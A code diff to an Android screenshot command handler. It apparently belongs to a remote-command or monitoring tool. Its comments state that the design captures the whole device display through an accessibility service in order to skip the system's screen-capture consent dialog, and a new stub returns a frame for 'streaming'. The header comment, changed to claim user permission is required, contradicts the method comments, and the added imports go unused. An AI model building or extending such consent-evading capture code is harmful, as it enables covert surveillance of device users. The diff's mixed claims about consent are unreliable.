@@ -1,7 +1,10 @@
 package com.task.tusker.commands;
 
+import android.app.Activity;
 import android.content.Context;
 import android.graphics.Bitmap;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.util.Base64;
 import android.view.View;
 import android.os.Build;
@@ -13,10 +16,8 @@ import java.io.File;
 import java.io.FileOutputStream;
 
 /**
- * Screenshot Handler - Capture the device display through AccessibilityService.
- *
- * This command intentionally does not use MediaProjection or request a capture
- * consent dialog. The accessibility service must be enabled on Android 11+.
+ * Screenshot Handler - Capture screen
+ * Note: Requires MediaProjection API and user permission
  */
 public class ScreenshotHandler {
 
@@ -29,8 +30,8 @@ public class ScreenshotHandler {
     /**
      * Take one screenshot through the running accessibility service.
      *
-     * AccessibilityService.takeScreenshot() (API 30+) captures the complete
-     * device display without MediaProjection consent.
+     * AccessibilityService.takeScreenshot() (API 30+) does not require a
+     * MediaProjection consent dialog and captures the complete device display.
      */
     public JSONObject takeScreenshot() {
         JSONObject result = new JSONObject();
@@ -86,6 +87,14 @@ public class ScreenshotHandler {
         }
         
         return result;
+    }
+
+    /**
+     * Attempt to return a Bitmap for streaming. Returns null if unavailable
+     * (MediaProjection API requires explicit user grant — use AccessibilityService instead).
+     */
+    public Bitmap captureBitmap() {
+        return null; // MediaProjection requires user consent at runtime; use AccessibilityService.captureScreenSync()
     }
 
     /**
